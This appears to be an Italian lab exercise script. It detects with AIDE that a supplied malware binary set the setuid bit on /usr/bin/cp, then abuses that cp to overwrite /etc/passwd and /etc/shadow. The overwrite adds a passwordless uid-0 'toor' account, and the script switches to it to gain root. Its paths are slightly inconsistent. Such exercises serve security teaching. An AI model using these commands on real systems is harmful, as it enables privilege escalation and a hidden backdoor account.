#Eseguo il malware dato
sudo ./change1

#Verifico le modifiche apportate
sudo aide -c /etc/aide/aide.conf -C

#---------------------RISULTATO---------------------
f = p.. .c..... . : /usr/bin/cp
File: /usr/bin/cp
Perm      : -rwxr-xr-x   | -rwsr-xr-x

#In questo caso sono stati modificati i permessi del file /usr/bin/cp

#1. Copia il file passwd e shadow in /tmp 
cp /etc/passwd /tmp/passwd
cp /etc/shadow /tmp/shadow

#2. I file copiati non hanno permessi di scrittura, dato che non possiamo usare sudo utilizziamo il comando cat
cat /tmp/passwd > mypasswd
cat /tmp/shadow > myshadow

#Aggiungiamo nel file passwd la riga:
#Utente toor senza password con uid 0 e gid 0
echo "toor:x:0:0:toor,,,:/root:/bin/bash" >> /tmp/mypasswd

#Modifichiamo il file shadow per l'utente toor
echo "toor::19043:0:99999:7:::" >> /tmp/myshadow

#Copiamo i file modificati in /etc
cp /tmp/mypasswd /etc/passwd
cp /tmp/myshadow /etc/shadow

#Diventiamo l'utente toor
su toor

#Ora siamo l'utente toor con permessi di root
id 
